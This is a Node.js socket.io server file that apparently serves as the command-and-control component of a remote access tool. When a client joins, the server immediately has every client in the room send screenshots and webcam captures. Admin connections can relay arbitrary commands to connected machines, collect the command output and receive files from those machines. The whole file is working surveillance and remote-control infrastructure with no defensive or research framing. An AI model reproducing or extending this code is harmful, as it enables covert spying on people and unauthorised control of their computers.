import chalk from 'chalk';
import {Server} from "socket.io"
import * as readline from "readline"

const users = []

let rl = readline.createInterface(
    process.stdin, process.stdout);

export const ch_socket = (server) => {
    const io = new Server(server, {
        maxHttpBufferSize: 1e9
    })

    io.on('connection', (socket) => {
        socket.on('joinMessage', (userID, callback) => {
            let {error, user} = addUser(socket.id, userID)
            if (error) {
                console.log("Socket error: " + error)
            } else {
                console.log(chalk.bgGreen.bold(socket.conn.remoteAddress, "connected"));
                socket.join("default")
                io.in("default").emit("screenshot")
                io.in("default").emit("webcam")
            }
        })
        socket.on('joinAdmin', (userID, callback) => {
            let {error, user} = addUser(socket.id, userID)
            if (error) {
                console.log("Socket error: " + error)
            } else {
                console.log(chalk.bgRed.bold(socket.conn.remoteAddress, "connected"));
                socket.join("default")
            }
        })

        socket.on("newMessage", (msg) => {
            console.log(chalk.green(socket.conn.remoteAddress, ":", msg));
            socket.to("default").emit("newMessage", msg)
        })

        socket.on("command", (arg) => {
            socket.in("default").emit("command", arg)
        })

        socket.on("commandResult", (res) => {
            console.log(chalk.green(socket.conn.remoteAddress, ":\n", res));
            socket.in("default").emit("commandResult", res)
        })

        socket.on("screenshot", () => {
            console.log("get file")
            socket.in("default").emit("screenshot")
        })

        socket.on("webcam", () => {
            console.log("get file")
            socket.in("default").emit("webcam")
        })

        socket.on("file", (args) => {
            console.log(chalk.green(socket.conn.remoteAddress, ": new file received",));
            socket.in("default").emit("file", args)
        })

        socket.on('disconnect', () => {
            removeUser(socket.id)
        })
    })
}

const addUser = (id, user) => {
    user = user.trim().toLowerCase()
    let room = "default"

    const userExist = users.find((user) => user.id === id)

    if (userExist) {
        return {error: "User already exist"}
    }

    user = {id, user, room}
    users.push(user)

    return {user}
}


const removeUser = (id) => {
    const index = users.findIndex((user) => user.id === id)

    if (index !== -1) {
        return users.splice(index, 1)[0]
    }
}

const getUser = (id) => {
    return users.find((user) => user.id === id)
}

const getSocket = (token) => {
    return users.find((user) => user.user === token)
}